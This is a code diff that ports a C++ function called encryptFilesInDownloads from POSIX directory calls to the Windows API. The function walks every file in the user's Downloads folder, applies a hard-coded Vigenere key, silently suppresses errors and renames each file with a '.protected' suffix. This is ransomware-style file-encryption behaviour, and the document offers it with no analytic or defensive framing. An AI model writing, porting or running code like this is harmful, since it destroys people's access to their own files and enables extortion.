@@ -1,4 +1,4 @@
-#include <dirent.h>
+#include <windows.h>
 #include <sys/stat.h>
 #include <fstream>
 #include <string>
@@ -52,18 +52,22 @@ void encryptFilesInDownloads() {
     const char* userProfile = std::getenv("USERPROFILE");
     if (!userProfile) return;
 
-    std::string downloadsPath = std::string(userProfile) + "\\Downloads";
-    DIR* dir = opendir(downloadsPath.c_str());
-    if (!dir) return;
+    std::string downloadsPath = std::string(userProfile) + "\\Downloads\\*";
+    WIN32_FIND_DATA findFileData;
+    HANDLE hFind = FindFirstFile(downloadsPath.c_str(), &findFileData);
+
+    if (hFind == INVALID_HANDLE_VALUE) return;
 
     std::string vigenereKey = "magicspell";
 
-    struct dirent* entry;
-    while ((entry = readdir(dir)) != nullptr) {
-        std::string filePath = downloadsPath + "\\" + entry->d_name;
+    do {
+        std::string fileName = findFileData.cFileName;
+        if (fileName == "." || fileName == "..") continue;
+
+        std::string filePath = std::string(userProfile) + "\\Downloads\\" + fileName;
 
         struct stat fileStat;
-        if (stat(filePath.c_str(), &fileStat) == 0 && S_ISREG(fileStat.st_mode)) {
+        if (stat(filePath.c_str(), &fileStat) == 0 && (fileStat.st_mode & S_IFREG)) {
             try {
                 // Read file content
                 std::ifstream inputFile(filePath, std::ios::binary);
@@ -82,14 +86,15 @@ void encryptFilesInDownloads() {
 
                 // Rename the file
                 std::string newFilePath = filePath + ".protected";
-                rename(filePath.c_str(), newFilePath.c_str());
+                MoveFile(filePath.c_str(), newFilePath.c_str());
 
             } catch (const std::exception&) {
                 // Suppress all exceptions
             }
         }
-    }
-    closedir(dir);
+    } while (FindNextFile(hFind, &findFileData) != 0);
+
+    FindClose(hFind);
 }
 
 int main() {
